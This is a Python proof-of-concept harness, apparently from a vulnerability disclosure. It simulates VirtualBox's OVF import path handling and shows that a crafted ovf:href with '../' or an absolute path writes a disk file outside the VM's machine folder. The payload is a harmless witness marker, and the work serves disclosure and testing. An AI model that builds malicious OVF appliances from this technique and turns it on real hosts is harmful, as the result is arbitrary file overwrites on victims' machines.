#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: vbox-ovf-href-dest-escape (High: 7.8)
#  Vendor: Oracle VM VirtualBox OSS
#  Versions: VirtualBox OSS 7.2.20 (f2792cf44)
#  Impact: OVF ovf:href dest walks off the machine folder via RTPathAbsExCxx
#  Requires: Source harness; docker compose; loopback; UI:R import on a real host
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "vbox-ovf-href-dest-escape"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Source harness for VirtualBox OVF ovf:href dest escape (G4).

Reimplements interpret() dest join, i_ensureUniqueImageFilePath, and the
import CREATE_REPLACE write. Does not boot VirtualBox.
"""

import os
from dataclasses import dataclass
from pathlib import Path

LABEL = "vbox-ovf-href-dest-escape"
WITNESS = "VBOX-OVF-HREF-DEST-ESCAPE-WITNESS"
PIN = "v7.2.20 f2792cf44f663989818507e36d3db5f978523c5e"
MACHINE_FOLDER = Path("/work/Machines/ImportedVM")
ORACLE_DIR = Path("/work/oracle")
RELATIVE_HREF = f"../oracle/{WITNESS}.vmdk"
ABSOLUTE_HREF = f"{ORACLE_DIR}/abs-{WITNESS}.iso"
CONTROL_HREF = "disk.vmdk"
MEDIUM_FORMAT_SUFFIXES = (".vmdk", ".iso", ".vdi", ".vhd", ".hdd", ".img", ".raw")
UNIQUE_LOOP_LIMIT = 1024
IPRT_BASE = Path("/VirtualBox/Machines")
IPRT_REL = "../VirtualBox.xml"
IPRT_WANT = Path("/VirtualBox/VirtualBox.xml")


@dataclass(frozen=True)
class UniqueResult:
    name: str
    abs_path: Path
    collided: bool


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def rt_path_suffix_offset(name: str) -> int:
    """Offset of RTPathSuffix, or len(name) when IPRT would return NULL."""
    suffix_at: int | None = None
    for index, char in enumerate(name):
        if char == "/":
            suffix_at = None
        elif char == ".":
            suffix_at = index
    if suffix_at is not None and suffix_at != 0 and suffix_at + 1 < len(name):
        return suffix_at
    return len(name)


def rt_path_suffix(name: str) -> str | None:
    offset = rt_path_suffix_offset(name)
    if offset >= len(name):
        return None
    return name[offset:]


def rt_path_abs_ex(base: Path, name: str) -> Path:
    """RTPathAbsExCxx without RTPATHABS_F_STOP_AT_BASE.

    Pin tests: absolute second argument wins; base `/VirtualBox/Machines` plus
    `../VirtualBox.xml` walks off the base. Do not confine to the machine folder.
    """
    if os.path.isabs(name):
        return Path(os.path.normpath(name))
    return Path(os.path.normpath(os.path.join(str(base), name)))


def is_under(path: Path, root: Path) -> bool:
    path_n = Path(os.path.normpath(str(path)))
    root_n = Path(os.path.normpath(str(root)))
    return path_n == root_n or root_n in path_n.parents


def require_medium_format_suffix(abs_dst: Path) -> str | None:
    """i_importOneDiskImage throws when the dest has no MediumFormat suffix."""
    suffix = rt_path_suffix(str(abs_dst))
    if suffix is None:
        return "has no extension"
    if suffix.lower() not in MEDIUM_FORMAT_SUFFIXES:
        return f"unsupported-suffix {suffix}"
    return None


def ensure_unique_image_file_path(machine_folder: Path, name: str) -> UniqueResult:
    """ApplianceImpl.cpp:1126-1160. Mutates aName; does not basename-strip.

    OpenMedium registration is not simulated; the file-exists branch is the
    leftover. Inserts `_%i` before the suffix of aName, not of the abs path.
    """
    original = name
    off_dash_num: int | None = None
    cch_dash_num = 0
    for index in range(1, UNIQUE_LOOP_LIMIT + 1):
        abs_name = rt_path_abs_ex(machine_folder, name)
        if not abs_name.exists():
            return UniqueResult(name=name, abs_path=abs_name, collided=name != original)
        if off_dash_num is None:
            off_dash_num = rt_path_suffix_offset(name)
        insert = f"_{index}"
        name = name[:off_dash_num] + insert + name[off_dash_num + cch_dash_num :]
        cch_dash_num = len(insert)
    raise ValueError("unique-path-exhausted")


def interpret_ovf_href_dest(machine_folder: Path, href: str) -> UniqueResult:
    """ApplianceImplImport.cpp:802-851: dest is di.strHref then unique helper."""
    filename = href
    if not filename:
        raise ValueError("empty-href")
    return ensure_unique_image_file_path(machine_folder, filename)


def import_create_and_write_destination_file(abs_dst: Path, payload: str) -> None:
    """ApplianceImplImport.cpp:1043-1053: mkdir parents, CREATE_REPLACE."""
    abs_dst.parent.mkdir(parents=True, exist_ok=True)
    with abs_dst.open("w", encoding="utf-8") as handle:
        handle.write(payload)


def import_one_disk_image(machine_folder: Path, dst_path: str, payload: str) -> Path:
    """ApplianceImplImport.cpp:4169-4171 AbsEx then CREATE_REPLACE write."""
    abs_dst = rt_path_abs_ex(machine_folder, dst_path)
    suffix_err = require_medium_format_suffix(abs_dst)
    if suffix_err is not None:
        raise ValueError(suffix_err)
    import_create_and_write_destination_file(abs_dst, payload)
    return abs_dst


def file_has_witness(path: Path) -> bool:
    if not path.is_file():
        return False
    text = path.read_text(encoding="utf-8")
    return WITNESS in text.splitlines() or text.strip() == WITNESS


def keeps_dotdot(name: str) -> bool:
    return ".." in Path(name).parts


def is_basename_only(name: str) -> bool:
    return Path(name).name == name


def main() -> int:
    log(f"label={LABEL} pin={PIN} witness={WITNESS}")
    log("ioc gadget=source-harness interpret-dest-join unique-path import-write")
    log("ioc vbox-boot=no")
    log(f"ioc machine-folder={MACHINE_FOLDER}")
    log(f"ioc oracle-dir={ORACLE_DIR}")

    try:
        MACHINE_FOLDER.mkdir(parents=True, exist_ok=True)
        ORACLE_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        return fail(f"mkdir {exc}")

    iprt = rt_path_abs_ex(IPRT_BASE, IPRT_REL)
    log(f"ioc iprt-absex={IPRT_BASE} + {IPRT_REL} -> {iprt}")
    if iprt != IPRT_WANT:
        return fail("iprt-absex-mismatch")
    log("ioc iprt-walks-off-base=yes")

    control_abs = rt_path_abs_ex(MACHINE_FOLDER, CONTROL_HREF)
    log(f"ioc control-href={CONTROL_HREF}")
    log(f"ioc control-abs={control_abs}")
    if not is_under(control_abs, MACHINE_FOLDER):
        return fail("control-escaped-folder")
    if control_abs != MACHINE_FOLDER / CONTROL_HREF:
        return fail("control-abs-mismatch")
    control_in_folder = True
    log("ioc control-in-folder=yes")

    relative_unique = interpret_ovf_href_dest(MACHINE_FOLDER, RELATIVE_HREF)
    log(f"ioc relative-href={RELATIVE_HREF}")
    log(f"ioc relative-unique-name={relative_unique.name}")
    log(f"ioc relative-abs={relative_unique.abs_path}")
    if relative_unique.name != RELATIVE_HREF:
        return fail("relative-unique-mutated-before-write")
    if not keeps_dotdot(relative_unique.name):
        return fail("relative-unique-stripped-dotdot")
    if is_under(relative_unique.abs_path, MACHINE_FOLDER):
        return fail("relative-stayed-in-folder")
    basename_only_dest = MACHINE_FOLDER / Path(RELATIVE_HREF).name
    if relative_unique.abs_path == basename_only_dest:
        return fail("relative-landed-on-basename")

    try:
        written = import_one_disk_image(MACHINE_FOLDER, relative_unique.name, f"{WITNESS}\n")
    except ValueError as exc:
        return fail(f"relative-write {exc}")
    except OSError as exc:
        return fail(f"relative-write-os {exc}")
    log(f"ioc relative-written={written}")
    if written != relative_unique.abs_path:
        return fail("relative-write-path-mismatch")
    if is_under(written, MACHINE_FOLDER):
        return fail("relative-write-in-folder")
    if not file_has_witness(written):
        return fail("relative-witness-missing")
    relative_escape = True
    log("ioc relative-escape=yes")

    unique_after = ensure_unique_image_file_path(MACHINE_FOLDER, RELATIVE_HREF)
    log(f"ioc unique-after-name={unique_after.name}")
    log(f"ioc unique-after-abs={unique_after.abs_path}")
    log(f"ioc unique-after-collided={str(unique_after.collided).lower()}")
    if not unique_after.collided:
        return fail("unique-did-not-see-existing")
    if not keeps_dotdot(unique_after.name):
        return fail("unique-stripped-dotdot")
    if is_basename_only(unique_after.name):
        return fail("unique-became-basename")
    if unique_after.name == Path(RELATIVE_HREF).name:
        return fail("unique-name-is-basename")
    want_unique = f"../oracle/{WITNESS}_1.vmdk"
    if unique_after.name != want_unique:
        return fail(f"unique-name-unexpected {unique_after.name}")
    if is_under(unique_after.abs_path, MACHINE_FOLDER):
        return fail("unique-abs-in-folder")
    unique_keeps_dotdot = True
    log("ioc unique-keeps-dotdot=yes")

    absolute_unique = interpret_ovf_href_dest(MACHINE_FOLDER, ABSOLUTE_HREF)
    log(f"ioc absolute-href={ABSOLUTE_HREF}")
    log(f"ioc absolute-unique-name={absolute_unique.name}")
    log(f"ioc absolute-abs={absolute_unique.abs_path}")
    if not os.path.isabs(absolute_unique.name):
        return fail("absolute-href-became-relative")
    if absolute_unique.abs_path != Path(os.path.normpath(ABSOLUTE_HREF)):
        return fail("absolute-ignored-base-failed")
    if is_under(absolute_unique.abs_path, MACHINE_FOLDER):
        return fail("absolute-landed-in-folder")
    if not str(absolute_unique.abs_path).startswith(str(ORACLE_DIR)):
        return fail("absolute-not-in-oracle")

    try:
        abs_written = import_one_disk_image(
            MACHINE_FOLDER, absolute_unique.name, f"{WITNESS}\n"
        )
    except ValueError as exc:
        return fail(f"absolute-write {exc}")
    except OSError as exc:
        return fail(f"absolute-write-os {exc}")
    log(f"ioc absolute-written={abs_written}")
    if not file_has_witness(abs_written):
        return fail("absolute-witness-missing")
    absolute_href = True
    log("ioc absolute-href=yes")

    if not (relative_escape and unique_keeps_dotdot and absolute_href and control_in_folder):
        return fail("token-incomplete")

    log(
        f"SUCCESS {LABEL} relative-escape=yes unique-keeps-dotdot=yes "
        f"absolute-href=yes control-in-folder=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

